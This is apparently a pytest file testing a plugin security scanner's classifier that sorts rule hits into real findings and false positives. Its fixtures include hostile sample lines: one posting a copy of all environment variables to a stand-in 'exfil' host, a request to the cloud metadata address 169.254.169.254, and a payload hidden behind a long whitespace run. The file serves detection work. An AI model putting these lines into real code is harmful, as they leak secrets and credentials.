"""Tests for the per-rule classifier bodies (TRDD-fe006962 Step 2)."""

from __future__ import annotations

import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))

import cpv_fp_classifier_rules  # noqa: F401,E402  — registers classifiers
from cpv_fp_classifier import Context, FindingVerdict, classify_rule  # noqa: E402
from cpv_fp_classifier_rules import load_plugin_meta  # noqa: E402


def _ctx(
    rule_id: str,
    line: str,
    *,
    surrounding: tuple[str, ...] = (),
    file_role: str = "source",
    file_path: str = "src/example.py",
    plugin_meta: dict | None = None,
) -> Context:
    return Context(
        rule_id=rule_id,
        matched_text=line,
        line_number=1,
        line=line,
        surrounding_lines=surrounding,
        file_role=file_role,
        file_path=file_path,
        plugin_meta=plugin_meta or {},
    )


class TestRc21Classifier:
    def test_subprocess_prep_definite_fp(self) -> None:
        ctx = _ctx(
            "RC-21",
            "env = os.environ.copy()",
            surrounding=("subprocess.Popen(cmd, env=env)",),
        )
        assert classify_rule("RC-21", ctx) is FindingVerdict.DEFINITE_FP

    def test_dict_environ_subprocess_prep(self) -> None:
        ctx = _ctx(
            "RC-21",
            "env = dict(os.environ)",
            surrounding=("subprocess.run(cmd, env=env)",),
        )
        assert classify_rule("RC-21", ctx) is FindingVerdict.DEFINITE_FP

    def test_copy_then_remote_post_real(self) -> None:
        ctx = _ctx(
            "RC-21",
            "all_env = os.environ.copy()",
            surrounding=("requests.post(\"https://exfil/\", json=all_env)",),
        )
        assert classify_rule("RC-21", ctx) is FindingVerdict.REAL

    def test_copy_no_context_likely_fp(self) -> None:
        ctx = _ctx("RC-21", "env = os.environ.copy()")
        # No subprocess hint, no exfil sink → ambiguous → LIKELY_FP.
        assert classify_rule("RC-21", ctx) is FindingVerdict.LIKELY_FP

    def test_iteration_pattern_stays_real(self) -> None:
        ctx = _ctx("RC-21", "for k in os.environ.items():")
        assert classify_rule("RC-21", ctx) is FindingVerdict.REAL

    def test_test_role_definite_fp(self) -> None:
        ctx = _ctx(
            "RC-21",
            "snapshot = dict(os.environ)",
            file_role="test",
            file_path="tests/test_env.py",
        )
        assert classify_rule("RC-21", ctx) is FindingVerdict.DEFINITE_FP

    def test_doc_role_likely_fp(self) -> None:
        ctx = _ctx("RC-21", "Object.keys(process.env)", file_role="doc")
        assert classify_rule("RC-21", ctx) is FindingVerdict.LIKELY_FP


class TestRc22Classifier:
    def test_clipboard_plugin_definite_fp(self) -> None:
        ctx = _ctx(
            "RC-22",
            "pbcopy < /tmp/x",
            plugin_meta={"name": "universal-clipboard", "keywords": ["clipboard"]},
        )
        assert classify_rule("RC-22", ctx) is FindingVerdict.DEFINITE_FP

    def test_non_clipboard_plugin_real(self) -> None:
        ctx = _ctx(
            "RC-22",
            "pbcopy < /tmp/x",
            plugin_meta={"name": "linter", "keywords": ["python"]},
        )
        assert classify_rule("RC-22", ctx) is FindingVerdict.REAL

    def test_test_role_definite_fp_even_without_domain(self) -> None:
        ctx = _ctx("RC-22", "pbcopy < /tmp/x", file_role="test", plugin_meta={})
        assert classify_rule("RC-22", ctx) is FindingVerdict.DEFINITE_FP


class TestRc65Classifier:
    def test_network_call_real(self) -> None:
        ctx = _ctx("RC-65", "requests.get('http://169.254.169.254/latest/')")
        assert classify_rule("RC-65", ctx) is FindingVerdict.REAL

    def test_unsafe_hosts_set_definite_fp(self) -> None:
        ctx = _ctx(
            "RC-65",
            "    '169.254.169.254',",
            surrounding=("UNSAFE_HOSTS = {", "    '127.0.0.1',"),
        )
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_FP

    def test_pattern_const_definite_fp(self) -> None:
        ctx = _ctx(
            "RC-65",
            "IMDS_HOSTS = ('169.254.169.254',)",
        )
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_FP


class TestRc87Classifier:
    def test_package_json_basename_definite_fp(self) -> None:
        ctx = _ctx(
            "RC-87",
            '    "@types/node": "^10.0.5",',
            file_path="package.json",
        )
        assert classify_rule("RC-87", ctx) is FindingVerdict.DEFINITE_FP

    def test_pyproject_toml_basename_definite_fp(self) -> None:
        ctx = _ctx(
            "RC-87",
            'requests = "10.0.5"',
            file_path="pyproject.toml",
        )
        assert classify_rule("RC-87", ctx) is FindingVerdict.DEFINITE_FP

    def test_version_field_in_arbitrary_file_definite_fp(self) -> None:
        ctx = _ctx(
            "RC-87",
            '"version": "10.0.5"',
            file_path="src/whatever.json",
        )
        assert classify_rule("RC-87", ctx) is FindingVerdict.DEFINITE_FP

    def test_internal_ip_in_source_real(self) -> None:
        ctx = _ctx("RC-87", "INTERNAL_HOST = '10.0.0.5'")
        assert classify_rule("RC-87", ctx) is FindingVerdict.REAL


class TestRc93Classifier:
    def test_table_row_definite_fp(self) -> None:
        ctx = _ctx("RC-93", "| key                              | value      |")
        assert classify_rule("RC-93", ctx) is FindingVerdict.DEFINITE_FP

    def test_table_separator_definite_fp(self) -> None:
        ctx = _ctx("RC-93", "|---|---|---|")
        assert classify_rule("RC-93", ctx) is FindingVerdict.DEFINITE_FP

    def test_long_run_in_source_real(self) -> None:
        ctx = _ctx("RC-93", "x" + (" " * 35) + "hidden_payload")
        assert classify_rule("RC-93", ctx) is FindingVerdict.REAL


class TestLoadPluginMeta:
    def test_canonical_path(self, tmp_path: Path) -> None:
        cp = tmp_path / ".claude-plugin"
        cp.mkdir()
        (cp / "plugin.json").write_text('{"name":"x","version":"1.0.0"}', encoding="utf-8")
        meta = load_plugin_meta(tmp_path)
        assert meta == {"name": "x", "version": "1.0.0"}

    def test_root_fallback(self, tmp_path: Path) -> None:
        (tmp_path / "plugin.json").write_text('{"name":"y"}', encoding="utf-8")
        meta = load_plugin_meta(tmp_path)
        assert meta == {"name": "y"}

    def test_missing_returns_empty(self, tmp_path: Path) -> None:
        assert load_plugin_meta(tmp_path) == {}

    def test_malformed_returns_empty(self, tmp_path: Path) -> None:
        cp = tmp_path / ".claude-plugin"
        cp.mkdir()
        (cp / "plugin.json").write_text("not json", encoding="utf-8")
        assert load_plugin_meta(tmp_path) == {}
